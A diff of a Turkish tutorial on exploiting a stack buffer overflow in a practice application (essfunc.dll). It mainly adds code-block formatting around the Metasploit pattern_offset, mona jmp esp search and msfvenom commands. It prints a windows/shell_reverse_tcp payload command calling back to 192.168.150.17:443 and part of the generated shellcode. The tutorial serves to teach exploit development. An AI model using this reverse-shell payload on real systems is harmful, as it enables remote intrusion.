@@ -65,10 +65,10 @@ Benzersiz string'i uygulamaya fuzzer scriptiyle veya uygulamaya bağlanıp o şe
 Debugger'da uygulama çalışırken string'i gönderdikten sonra uygulama yine crash olacaktır. Bu sefer debugger'da EIP register'ının aldığı karakterleri görüyoruz: 396F4338
 EIP'deki ascii olarak olan 396F4338 bu karakterlerin oluşturduğumuz string içindeki hangi pozisyonda bulunduğunu hesaplamak için ise bu sefer MSF'in pattern_offset aracını kullanacağız:
 
-`
+```shell
 /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 396F4338
 [*] Exact match at offset 2006
-`
+```
 
 Artık uygulamanın tam olarak crash verdiği noktayı bulduk: 2006
 Yani; uygulamaya 2006 karakter uzunluğunda string gönderilme durumunda kırılıyormuş.
@@ -115,7 +115,7 @@ instuctor'ını yazarak bunun kod halini alabiliriz:
 > 00000000  FFE4              jmp esp
 ```
 
-Modülümüz üzerinde bu instructor var mı onu arayacağız. Bunun için mona'nın find özelliğini kullanacağız: !mona find -s '\xff\xe4' -m essfunc.dll
+Modülümüz üzerinde bu instructor var mı onu arayacağız. Bunun için mona'nın find özelliğini kullanacağız: `!mona find -s '\xff\xe4' -m essfunc.dll`
 
 Bulduğu birkaç adreste ilgili instructor'ın olduğunu bize gösterecektir. Test amaçlı çıkan sonuçlardan en üsttekine çift tıklayıp jmp esp'nin olduğunu görebiliriz.
 
@@ -201,10 +201,12 @@ Fuzzer scriptini çalıştırıp dönen register'larda ESP'ye sağ tıklayıp Fo
 Shellcode oluşturmak için MSFVenom kullanabiliriz.
 
 Windows platformlar için uygun, içinde nullbyte geçmeyen, C tipinde olan, belirtilen ip ve porta ters bağlantıyla shell açtırmaya yarayan bir payload oluşturuyoruz:
+`
 msfvenom -p windows/shell_reverse_tcp LHOST=192.168.150.17 LPORT=443 -f c --bad-chars '\x00'
+`
 
 Oluşturulan shellcode:
-
+```shell
 Payload size: 351 bytes
 Final size of c file: 1500 bytes
 unsigned char buf[] = 
@@ -232,7 +234,7 @@ unsigned char buf[] =
 "\xf9\x47\x79\x24\xd0\xc3\x89\x6f\x78\x65\x02\x36\xe9\x37\x4f"
 "\xc9\xc4\x74\x76\x4a\xec\x04\x8d\x52\x85\x01\xc9\xd4\x76\x78"
 "\x42\xb1\x78\x2f\x63\x90";
-
+```
 Exploit'imizin son hali:
 
 ```python
